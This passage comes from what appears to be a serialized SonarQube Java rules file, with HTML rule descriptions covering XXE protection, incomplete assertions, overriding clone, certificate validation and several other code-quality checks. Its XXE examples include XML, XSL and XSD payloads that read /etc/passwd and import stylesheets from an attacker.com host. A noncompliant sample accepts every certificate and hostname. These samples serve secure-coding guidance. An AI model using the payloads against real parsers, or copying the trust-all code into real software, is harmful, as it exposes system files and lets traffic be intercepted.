  &lt;heading&gt;Reminder&lt;/heading&gt;
  &lt;body&gt;Don't forget me this weekend!&lt;/body&gt;
&lt;/note&gt;
</pre>
<p>Example in XSL document:</p>
<pre>
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
  &lt;!ENTITY content SYSTEM "file:/etc/passwd"&gt;
]&gt;
&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
  &lt;xsl:import href="http://www.attacker.com/evil.xsl"/&gt;
  &lt;xsl:include href="http://www.attacker.com/evil.xsl"/&gt;
 &lt;xsl:template match="/"&gt;
  &amp;content;
 &lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;
</pre>
<p>Example in XSD document:</p>
<pre>
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE schema PUBLIC "-//W3C//DTD XMLSchema 200102//EN" "" [
   &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
  ]&gt;
&lt;xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"&gt;
  &lt;xs:import namespace="test" schemaLocation="http://www.attacker.com/evil.xsd"/&gt;
  &lt;xs:element name="note"&gt;
    &lt;xs:complexType&gt;
      &lt;xs:sequence&gt;
        &lt;xs:element name="to" type="xs:string"/&gt;
        &lt;xs:element name="from" type="xs:string"/&gt;
        &lt;xs:element name="heading" type="xs:string"/&gt;
        &lt;xs:element name="body" type="xs:string"/&gt;
      &lt;/xs:sequence&gt;
    &lt;/xs:complexType&gt;
  &lt;/xs:element&gt;
&lt;/xs:schema&gt;
</pre>
<p>To protect Java XML Parsers from XXE attacks <a href="http://openjdk.java.net/jeps/185">these properties</a> have been implemented:</p>
<p>- ACCESS_EXTERNAL_DTD: should be set to "" when processing XML/XSD/XLS files (it looks for external DOCTYPEs)</p>
<p>- ACCESS_EXTERNAL_SCHEMA: should be set to "" when processing XML/XSD/XLS files (it looks for external schemalocation ect)</p>
<p>- ACCESS_EXTERNAL_STYLESHEET should be set to "" when processing XLS file (it looks for external imports, includes ect); </p>
<p>Avoid FEATURE_SECURE_PROCESSING feature to protect from XXE attacks because depending on the implementation:</p>
<p>- it has <a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/XMLConstants.html#FEATURE_SECURE_PROCESSING">no effect</a> to protect the
parser from XXE attacks</p>
<p>- or it's just an obscur shortcut (it could set ACCESS_EXTERNAL_DTD and ACCESS_EXTERNAL_SCHEMA to '')</p>
<h2>Noncompliant Code Examples</h2>
<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/DocumentBuilderFactory.html">DocumentBuilderFactory</a> library:</p>
<pre>
String xml = "xxe.xml";
DocumentBuilderFactory df = DocumentBuilderFactory.newInstance();  // Noncompliant
DocumentBuilder builder = df.newDocumentBuilder();
Document document = builder.parse(new InputSource(xml));
DOMSource domSource = new DOMSource(document);
</pre>
<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/SAXParserFactory.html">SAXParserFactory</a> library:</p>
<pre>
String xml = "xxe.xml";
SaxHandler handler = new SaxHandler();
SAXParserFactory factory = SAXParserFactory.newInstance();
SAXParser parser = factory.newSAXParser();  // Noncompliant
parser.parse(xml, handler);
</pre>
<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/stream/XMLInputFactory.html">XMLInputFactory</a> library:</p>
<pre>
XMLInputFactory factory = XMLInputFactory.newInstance();  // Noncompliant
XMLEventReader eventReader = factory.createXMLEventReader(new FileReader("xxe.xml"));
</pre>
<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/transform/TransformerFactory.html">TransformerFactory</a> library:</p>
<pre>
String xslt = "xxe.xsl";
String xml = "xxe.xml";
TransformerFactory transformerFactory = javax.xml.transform.TransformerFactory.newInstance();  // Noncompliant
Transformer transformer = transformerFactory.newTransformer(new StreamSource(xslt));

StringWriter writer = new StringWriter();
transformer.transform(new StreamSource(xml), new StreamResult(writer));
String result = writer.toString();
</pre>
<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/SchemaFactory.html">SchemaFactory</a> library:</p>
<pre>
String xsd = "xxe.xsd";
StreamSource xsdStreamSource = new StreamSource(xsd);

SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);  // Noncompliant
Schema schema = schemaFactory.newSchema(xsdStreamSource);
</pre>
<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/Validator.html">Validator</a> library:</p>
<pre>
String xsd = "xxe.xsd";
String xml = "xxe.xml";
StreamSource xsdStreamSource = new StreamSource(xsd);
StreamSource xmlStreamSource = new StreamSource(xml);

SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
Schema schema = schemaFactory.newSchema(xsdStreamSource);
Validator validator = schema.newValidator();   // Noncompliant

StringWriter writer = new StringWriter();
validator.validate(xmlStreamSource, new StreamResult(writer));
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/DocumentBuilderFactory.html">DocumentBuilderFactory</a> library:</p>
<pre>
String xml = "xxe.xml";
DocumentBuilderFactory df = DocumentBuilderFactory.newInstance();
df.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, ""); // Compliant
df.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, ""); // compliant
DocumentBuilder builder = df.newDocumentBuilder();
Document document = builder.parse(new InputSource(xml));
DOMSource domSource = new DOMSource(document);
</pre>
<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/SAXParserFactory.html">SAXParserFactory</a> library:</p>
<pre>
String xml = "xxe.xml";
SaxHandler handler = new SaxHandler();
SAXParserFactory factory = SAXParserFactory.newInstance();
SAXParser parser = factory.newSAXParser();
parser.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, ""); // Compliant
parser.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, ""); // compliant
parser.parse(xml, handler);
</pre>
<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/stream/XMLInputFactory.html">XMLInputFactory</a> library:</p>
<pre>
XMLInputFactory factory = XMLInputFactory.newInstance();
factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, ""); // Compliant
factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");  // compliant

XMLEventReader eventReader = factory.createXMLEventReader(new FileReader("xxe.xml"));
</pre>
<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/transform/TransformerFactory.html">TransformerFactory</a> library:</p>
<pre>
String xslt = "xxe.xsl";
String xml = "xxe.xml";
TransformerFactory transformerFactory = javax.xml.transform.TransformerFactory.newInstance();
transformerFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, ""); // Compliant
transformerFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, ""); // Compliant
// ACCESS_EXTERNAL_SCHEMA not supported in several TransformerFactory implementations
Transformer transformer = transformerFactory.newTransformer(new StreamSource(xslt));

StringWriter writer = new StringWriter();
transformer.transform(new StreamSource(xml), new StreamResult(writer));
String result = writer.toString();
</pre>
<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/SchemaFactory.html">SchemaFactory</a> library:</p>
<pre>
String xsd = "xxe.xsd";
StreamSource xsdStreamSource = new StreamSource(xsd);

SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
schemaFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, ""); // Compliant
schemaFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, ""); // Compliant
Schema schema = schemaFactory.newSchema(xsdStreamSource);
</pre>
<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/Validator.html">Validator</a> library:</p>
<pre>
String xsd = "xxe.xsd";
String xml = "xxe.xml";
StreamSource xsdStreamSource = new StreamSource(xsd);
StreamSource xmlStreamSource = new StreamSource(xml);

SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
Schema schema = schemaFactory.newSchema(xsdStreamSource);
schemaFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
schemaFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
// validators will also inherit of these properties
Validator validator = schema.newValidator();

validator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");   // Compliant
validator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");   // Compliant

StringWriter writer = new StringWriter();
validator.validate(xmlStreamSource, new StreamResult(writer));
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)">OWASP Top 10 2017 Category A4</a> - XML External Entities
  (XXE) </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java">OWASP XXE Prevention Cheat
  Sheet</a> </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/611.html">MITRE, CWE-611</a> - Information Exposure Through XML External Entity Reference </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/827.html">MITRE, CWE-827</a> - Improper Control of Document Type Definition </li>
</ul>ZVULNERABILITY
˘

java:S2970Í
javaS2970Assertions should be complete"BLOCKER*java:†<p>It is very easy to write incomplete assertions when using some test frameworks. This rule enforces complete assertions in the following cases:</p>
<ul>
  <li> Fest: <code>assertThat</code> is not followed by an assertion invocation </li>
  <li> AssertJ: <code>assertThat</code> is not followed by an assertion invocation </li>
  <li> Mockito: <code>verify</code> is not followed by a method invocation </li>
  <li> Truth: <code>assertXXX</code> is not followed by an assertion invocation </li>
</ul>
<p>In such cases, what is intended to be a test doesn't actually verify anything</p>
<h2>Noncompliant Code Example</h2>
<pre>
// Fest
boolean result = performAction();
// let's now check that result value is true
assertThat(result); // Noncompliant; nothing is actually checked, the test passes whether "result" is true or false

// Mockito
List mockedList = Mockito.mock(List.class);
mockedList.add("one");
mockedList.clear();
// let's check that "add" and "clear" methods are actually called
Mockito.verify(mockedList); // Noncompliant; nothing is checked here, oups no call is chained to verify()
</pre>
<h2>Compliant Solution</h2>
<pre>
// Fest
boolean result = performAction();
// let's now check that result value is true
assertThat(result).isTrue();

// Mockito
List mockedList = Mockito.mock(List.class);
mockedList.add("one");
mockedList.clear();
// let's check that "add" and "clear" methods are actually called
Mockito.verify(mockedList).add("one");
Mockito.verify(mockedList).clear();
</pre>
<h2>Exceptions</h2>
<p>Variable assignments and return statements are skipped to allow helper methods.</p>
<pre>
private BooleanAssert check(String filename, String key) {
  String fileContent = readFileContent(filename);
  performReplacements(fileContent);
  return assertThat(fileContent.contains(key)); // No issue is raised here
}

@Test
public void test() {
  check("foo.txt", "key1").isTrue();
  check("bar.txt", "key2").isTrue();
}
</pre>Z
CODE_SMELL
◊

java:S2975»
javaS2975 "clone" should not be overridden"BLOCKER*java:˚<p>Many consider <code>clone</code> and <code>Cloneable</code> broken in Java, largely because the rules for overriding <code>clone</code> are tricky
and difficult to get right, according to Joshua Bloch:</p>
<blockquote>
  Object's clone method is very tricky. It's based on field copies, and it's "extra-linguistic." It creates an object without calling a constructor.
  There are no guarantees that it preserves the invariants established by the constructors. There have been lots of bugs over the years, both in and
  outside Sun, stemming from the fact that if you just call super.clone repeatedly up the chain until you have cloned an object, you have a shallow
  copy of the object. The clone generally shares state with the object being cloned. If that state is mutable, you don't have two independent objects.
  If you modify one, the other changes as well. And all of a sudden, you get random behavior.
</blockquote>
<p>A copy constructor or copy factory should be used instead.</p>
<p>This rule raises an issue when <code>clone</code> is overridden, whether or not <code>Cloneable</code> is implemented.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {
  // ...

  public Object clone() { // Noncompliant
    //...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {
  // ...

  MyClass (MyClass source) {
    //...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://www.artima.com/intv/bloch13.html">Copy Constructor versus Cloning</a> </li>
</ul>
<h3>See Also</h3>
<ul>
  <li> <a href='/coding_rules#rule_key=squid%3AS2157'>S2157</a> - "Cloneables" should implement "clone" </li>
  <li> <a href='/coding_rules#rule_key=squid%3AS1182'>S1182</a> - Classes that override "clone" should be "Cloneable" and call "super.clone()" </li>
</ul>Z
CODE_SMELL
Ë

java:S3510Ÿ
javaS35107"HostnameVerifier.verify" should not always return true"BLOCKER*java:Ú<p>To prevent URL spoofing, <code>HostnameVerifier.verify()</code> methods should do more than simply <code>return true</code>. Doing so may get you
quickly past an exception, but that comes at the cost of opening a security hole in your application. </p>
<h2>Noncompliant Code Example</h2>
<pre>
SSLContext sslcontext = SSLContext.getInstance( "TLS" );
sslcontext.init(null, new TrustManager[]{new X509TrustManager() {
  public void checkClientTrusted(X509Certificate[] arg0, String arg1) throws CertificateException {}
  public void checkServerTrusted(X509Certificate[] arg0, String arg1) throws CertificateException {}
  public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }

}}, new java.security.SecureRandom());

Client client = ClientBuilder.newBuilder().sslContext(sslcontext).hostnameVerifier(new HostnameVerifier() {
  @Override
  public boolean verify(String requestedHost, SSLSession remoteServerSession) {
    return true;  // Noncompliant
  }
}).build();
</pre>
<h2>Compliant Solution</h2>
<pre>
SSLContext sslcontext = SSLContext.getInstance( "TLSv1.2" );
sslcontext.init(null, new TrustManager[]{new X509TrustManager() {
  @Override
  public void checkClientTrusted(X509Certificate[] arg0, String arg1) throws CertificateException {}
  @Override
  public void checkServerTrusted(X509Certificate[] arg0, String arg1) throws CertificateException {}
  @Override
  public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }

}}, new java.security.SecureRandom());

Client client = ClientBuilder.newBuilder().sslContext(sslcontext).hostnameVerifier(new HostnameVerifier() {
  @Override
  public boolean verify(String requestedHost, SSLSession remoteServerSession) {
    return requestedHost.equalsIgnoreCase(remoteServerSession.getPeerHost()); // Compliant
  }
}).build();
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/295.html">MITRE, CWE-295</a> - Improper Certificate Validation </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#WEAK_HOSTNAME_VERIFIER">WEAK_HOSTNAME_VERIFIER</a> </li>
</ul>ZVULNERABILITY
û

java:S4602è
javaS4602W"@SpringBootApplication" and "@ComponentScan" should not be used in the default package"BLOCKER*java:í<p><code>@ComponentScan</code> is used to determine which Spring Beans are available in the application context. The packages to scan can be
configured thanks to the <code>basePackageClasses</code> or <code>basePackages</code> (or its alias <code>value</code>) parameters. If neither
parameter is configured, <code>@ComponentScan</code> will consider only the package of the class annotated with it. When <code>@ComponentScan</code>
is used on a class belonging to the default package, the entire classpath will be scanned.</p>
<p>This will slow-down the start-up of the application and it is likely the application will fail to start with an
<code>BeanDefinitionStoreException</code> because you ended up scanning the Spring Framework package itself.</p>
<p>This rule raises an issue when:</p>
<p>- <code>@ComponentScan</code>, <code>@SpringBootApplication</code> and <code>@ServletComponentScan</code> are used on a class belonging to the
default package</p>
<p>- <code>@ComponentScan</code> is explicitly configured with the default package</p>
<h2>Noncompliant Code Example</h2>
<pre>
import org.springframework.boot.SpringApplication;

@SpringBootApplication // Noncompliant; RootBootApp is declared in the default package
public class RootBootApp {
...
}
</pre>
<pre>
@ComponentScan("")
public class Application {
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
package hello;

import org.springframework.boot.SpringApplication;

@SpringBootApplication // Compliant; RootBootApp belongs to the "hello" package
public class RootBootApp {
...
}
</pre>ZBUG
Å

java:S3753Ú

javaS3753l"@Controller" classes that use "@SessionAttributes" must call "setComplete" on their "SessionStatus" objects"BLOCKER*java:‡	<p>A Spring <code>@Controller</code> that uses <code>@SessionAttributes</code> is designed to handle a stateful / multi-post form. Such
<code>@Controller</code>s use the specified <code>@SessionAttributes</code> to store data on the server between requests. That data should be cleaned
up when the session is over, but unless <code>setComplete()</code> is called on the <code>SessionStatus</code> object from a
<code>@RequestMapping</code> method, neither Spring nor the JVM will know it's time to do that. Note that the <code>SessionStatus</code> object must
be passed to that method as a parameter.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Controller
@SessionAttributes("hello")  // Noncompliant; this doesn't get cleaned up
public class HelloWorld {

  @RequestMapping("/greet", method = GET)
  public String greet(String greetee) {

    return "Hello " + greetee;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Controller
@SessionAttributes("hello")
public class HelloWorld {

  @RequestMapping("/greet", method = GET)
  public String greet(String greetee) {

    return "Hello " + greetee;
  }

  @RequestMapping("/goodbye", method = POST)
  public String goodbye(SessionStatus status) {
    //...
    status.setComplete();
  }

}
</pre>ZBUG
‘

java:S3751≈
javaS3751,"@RequestMapping" methods should be "public""BLOCKER*java:È<p>A method with a <code>@RequestMapping</code> annotation part of a class annotated with <code>@Controller</code> (directly or indirectly through a
meta annotation - <code>@RestController</code> from Spring Boot is a good example) will be called to handle matching web requests. That will happen
even if the method is <code>private</code>, because Spring invokes such methods via reflection, without checking visibility. </p>
<p>So marking a sensitive method <code>private</code> may seem like a good way to control how such code is called. Unfortunately, not all Spring
frameworks ignore visibility in this way. For instance, if you've tried to control web access to your sensitive, <code>private</code>,
<code>@RequestMapping</code> method by marking it <code>@Secured</code> ... it will still be called, whether or not the user is authorized to access
it. That's because AOP proxies are not applied to non-public methods.</p>
<p>In addition to <code>@RequestMapping</code>, this rule also considers the annotations introduced in Spring Framework 4.3: <code>@GetMapping</code>,
<code>@PostMapping</code>, <code>@PutMapping</code>, <code>@DeleteMapping</code>, <code>@PatchMapping</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@RequestMapping("/greet", method = GET)
private String greet(String greetee) {  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
@RequestMapping("/greet", method = GET)
public String greet(String greetee) {
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
</ul>ZVULNERABILITY
Û	

java:S1451‰	
javaS1451+Track lack of copyright and license headers"BLOCKER*java:å	<p>Each source file should start with a header stating file ownership and the license which must be used to distribute the application. </p>
<p>This rule must be fed with the header text that is expected at the beginning of every file.</p>
<h2>Compliant Solution</h2>
<pre>
/*
 * SonarQube, open source software quality management tool.
 * Copyright (C) 2008-2013 SonarSource
 * mailto:contact AT sonarsource DOT com
 *
 * SonarQube is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 3 of the License, or (at your option) any later version.
 *
 * SonarQube is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 */
</pre>Z
CODE_SMELL
Ü	

java:S1219˜
javaS12196"switch" statements should not contain non-case labels"BLOCKER*java:î<p>Even if it is legal, mixing case and non-case labels in the body of a switch statement is very confusing and can even be the result of a typing
error.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (day) {
  case MONDAY:
  case TUESDAY:
  WEDNESDAY:   // Noncompliant; syntactically correct, but behavior is not what's expected
    doSomething();
    break;
  ...
}

switch (day) {
  case MONDAY:
    break;
  case TUESDAY:
    foo:for(int i = 0 ; i &lt; X ; i++) {  // Noncompliant; the code is correct and behaves as expected but is barely readable
         /* ... */
        break foo;  // this break statement doesn't relate to the nesting case TUESDAY
         /* ... */
    }
    break;
    /* ... */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (day) {
  case MONDAY:
  case TUESDAY:
  case WEDNESDAY:
    doSomething();
    break;
  ...
}

switch (day) {
  case MONDAY:
    break;
  case TUESDAY:
    compute(args); // put the content of the labelled "for" statement in a dedicated method
    break;

    /* ... */
}
</pre>Z
CODE_SMELL
”

java:S3516ƒ
javaS3516'Methods returns should not be invariant"BLOCKER*java:<p>When a method is designed to return an invariant value, it may be poor design, but it shouldn't adversely affect the outcome of your program.
However, when it happens on all paths through the logic, it is surely a bug.</p>
<p>This rule raises an issue when a method contains several <code>return</code> statements that all return the same value.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int foo(int a) {
  int b = 12;
  if (a == 1) {
    return b;
  }
  return b;  // Noncompliant
}
</pre>Z
CODE_SMELL
Ç

java:S2437Û
javaS2437,Silly bit operations should not be performed"BLOCKER*java:ö<p>Certain bit operations are just silly and should not be performed because their results are predictable.</p>
<p>Specifically, using <code>&amp; -1</code> with any value will always result in the original value, as will <code>anyValue ^ 0</code> and
<code>anyValue | 0</code>.</p>Z
CODE_SMELL
ı

java:S1314Ê
javaS1314Octal values should not be used"BLOCKER*java:ö<p>Integer literals starting with a zero are octal rather than decimal values. While using octal values is fully supported, most developers do not
have experience with them. They may not recognize octal values as such, mistaking them instead for decimal values.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int myNumber = 010;   // Noncompliant. myNumber will hold 8, not 10 - was this really expected?
</pre>
<h2>Compliant Solution</h2>
<pre>
int myNumber = 8;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/_QC7AQ">CERT, DCL18-C.</a> - Do not begin integer constants with 0 when specifying a
  decimal value </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/hYClBg">CERT, DCL50-J.</a> - Use visually distinct identifiers </li>
</ul>Z
CODE_SMELL
∂
	java:S128®
javaS128?Switch cases should end with an unconditional "break" statement"BLOCKER*java:Ω<p>When the execution is not explicitly terminated at the end of a switch case, it continues to execute the statements of the following case. While
this is sometimes intentional, it often is a mistake which leads to unexpected behavior. </p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (myVariable) {
  case 1:
    foo();
    break;
  case 2:  // Both 'doSomething()' and 'doSomethingElse()' will be executed. Is it on purpose ?
    doSomething();
  default:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (myVariable) {
  case 1:
    foo();
    break;
  case 2:
    doSomething();
    break;
  default:
    doSomethingElse();
    break;
}
</pre>
<h2>Exceptions</h2>
<p>This rule is relaxed in the following cases:</p>
<pre>
switch (myVariable) {
  case 0:                                // Empty case used to specify the same behavior for a group of cases.
  case 1:
    doSomething();
    break;
  case 2:                                // Use of return statement
    return;
  case 3:                                // Use of throw statement
    throw new IllegalStateException();
  case 4:                                // Use of continue statement
    continue;
  default:                               // For the last case, use of break statement is optional
    doSomethingElse();
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/484.html">MITRE, CWE-484</a> - Omitted Break Statement in Switch </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/YIFLAQ">CERT, MSC17-C.</a> - Finish every set of statements associated with a case
  label with a break statement </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/ewHAAQ">CERT, MSC52-J.</a> - Finish every set of statements associated with a case
  label with a break statement </li>
</ul>Z
CODE_SMELL
¯

java:S1845È
javaS1845OMethods and field names should not be the same or differ only by capitalization"BLOCKER*java:Ì<p>Looking at the set of methods in a class, including superclass methods, and finding two methods or fields that differ only by capitalization is
confusing to users of the class. It is similarly confusing to have a method and a field which differ only in capitalization or a method and a field
with exactly the same name and visibility.</p>
<p>In the case of methods, it may have been a mistake on the part of the original developer, who intended to override a superclass method, but instead
added a new method with nearly the same name.</p>
<p>Otherwise, this situation simply indicates poor naming. Method names should be action-oriented, and thus contain a verb, which is unlikely in the
case where both a method and a member have the same name (with or without capitalization differences). However, renaming a public method could be
disruptive to callers. Therefore renaming the member is the recommended action.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Car{

  public DriveTrain drive;

  public void tearDown(){...}

  public void drive() {...}  // Noncompliant; duplicates field name
}

public class MyCar extends Car{
  public void teardown(){...}  // Noncompliant; not an override. It it really what's intended?

  public void drivefast(){...}

  public void driveFast(){...} //Huh?
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Car{

  private DriveTrain drive;

  public void tearDown(){...}

  public void drive() {...}  // field visibility reduced
}

public class MyCar extends Car{
  @Override
  public void tearDown(){...}

  public void drivefast(){...}

  public void driveReallyFast(){...}

}
</pre>Z
CODE_SMELL
ã

java:S2188¸
javaS2188*JUnit test cases should call super methods"BLOCKER*java:•<p>Overriding a parent class method prevents that method from being called unless an explicit <code>super</code> call is made in the overriding
method. In some cases not calling the <code>super</code> method is acceptable, but not with <code>setUp</code> and <code>tearDown</code> in a JUnit 3
<code>TestCase</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClassTest extends MyAbstractTestCase {

  private MyClass myClass;
    @Override
    protected void setUp() throws Exception {  // Noncompliant
      myClass = new MyClass();
    }
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClassTest extends MyAbstractTestCase {

  private MyClass myClass;
    @Override
    protected void setUp() throws Exception {
      super.setUp();
      myClass = new MyClass();
    }
</pre>Z
CODE_SMELL
â

java:S2189˙
javaS2189Loops should not be infinite"BLOCKER*java:∏<p>An infinite loop is one that will never end while the program is running, i.e., you have to kill the program to get out of the loop. Whether it is
by meeting the loop's end condition or via a <code>break</code>, every loop should have an end condition.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (;;) {  // Noncompliant; end condition omitted
  // ...
}

int j;
while (true) { // Noncompliant; end condition omitted
  j++;
}

int k;
boolean b = true;
while (b) { // Noncompliant; b never written to in loop
  k++;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int j;
while (true) { // reachable end condition added
  j++;
  if (j  == Integer.MIN_VALUE) {  // true at Integer.MAX_VALUE +1
    break;
  }
}

int k;
boolean b = true;
while (b) {
  k++;
  b = k &lt; Integer.MAX_VALUE;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/PYHfAw">CERT, MSC01-J.</a> - Do not use an empty infinite loop </li>
</ul>ZBUG
ú

java:S2187ç
javaS2187TestCases should contain tests"BLOCKER*java:¬<p>There's no point in having a JUnit <code>TestCase</code> without any test methods. Similarly, you shouldn't have a file in the tests directory with
"Test" in the name, but no tests in the file. Doing either of these things may lead someone to think that uncovered classes have been tested.</p>
<p>This rule raises an issue when files in the test directory have "Test" in the name or implement <code>TestCase</code> but don't contain any
tests.</p>Z
CODE_SMELL
±

java:S3046¢
javaS30468"wait" should not be called when multiple locks are held"BLOCKER*java:ƒ<p>When two locks are held simultaneously, a <code>wait</code> call only releases one of them. The other will be held until some other thread requests
a lock on the awaited object. If no unrelated code tries to lock on that object, then all other threads will be locked out, resulting in a
deadlock.</p>
<h2>Noncompliant Code Example</h2>
<pre>
synchronized (this.mon1) {  // threadB can't enter this block to request this.mon2 lock &amp; release threadA
	synchronized (this.mon2) {
		this.mon2.wait();  // Noncompliant; threadA is stuck here holding lock on this.mon1
	}
}
</pre>ZBUG
¿

java:S3282±
javaS3282<EJB interceptor exclusions should be declared as annotations"BLOCKER*java:»<p>Exclusions for default interceptors can be declared either in xml or as class annotations. Since annotations are more visible to maintainers, they
are preferred.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;assembly-descriptor&gt;
      &lt;interceptor-binding&gt;
         &lt;ejb-name&gt;MyExcludedClass&lt;/ejb-name&gt;
         &lt;exclude-default-interceptors&gt;true&lt;/exclude-default-interceptors&gt; &lt;!-- Noncompliant --&gt;
         &lt;exclude-class-interceptors&gt;true&lt;/exclude-class-interceptors&gt; &lt;!-- Noncomopliant --&gt;
         &lt;method&gt;
           &lt;method-name&gt;doTheThing&lt;/method-name&gt;
         &lt;/method&gt;
      &lt;/interceptor-binding&gt;

&lt;/assembly-descriptor&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
@ExcludeDefaultInterceptors
public class MyExcludedClass implements MessageListener
{

  @ExcludeClassInterceptors
  @ExcludeDefaultInterceptors
  public void doTheThing() {
    // ...
  }
</pre>Z
CODE_SMELL
Ù


java:S3281Â

javaS3281<Default EJB interceptors should be declared in "ejb-jar.xml""BLOCKER*java:˘	<p>Default interceptors, such as application security interceptors, must be listed in the <code>ejb-jar.xml</code> file, or they will not be treated
as default. </p>
<p>This rule applies to projects that contain JEE Beans (any one of <code>javax.ejb.Singleton</code>, <code>MessageDriven</code>,
<code>Stateless</code> or <code>Stateful</code>).</p>
<h2>Noncompliant Code Example</h2>
<pre>
// file: ejb-interceptors.xml
&lt;assembly-descriptor&gt;
 &lt;interceptor-binding&gt; &lt;!-- should be declared in ejb-jar.xml --&gt;
      &lt;ejb-name&gt;*&lt;/ejb-name&gt;
      &lt;interceptor-class&gt;com.myco.ImportantInterceptor&lt;/interceptor-class&gt;&lt;!-- Noncompliant; will NOT be treated as default --&gt;
   &lt;/interceptor-binding&gt;
&lt;/assembly-descriptor&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
// file: ejb-jar.xml
&lt;assembly-descriptor&gt;
 &lt;interceptor-binding&gt;
      &lt;ejb-name&gt;*&lt;/ejb-name&gt;
      &lt;interceptor-class&gt;com.myco.ImportantInterceptor&lt;/interceptor-class&gt;
   &lt;/interceptor-binding&gt;
&lt;/assembly-descriptor&gt;
</pre>
<h2>See</h2>
<ul>
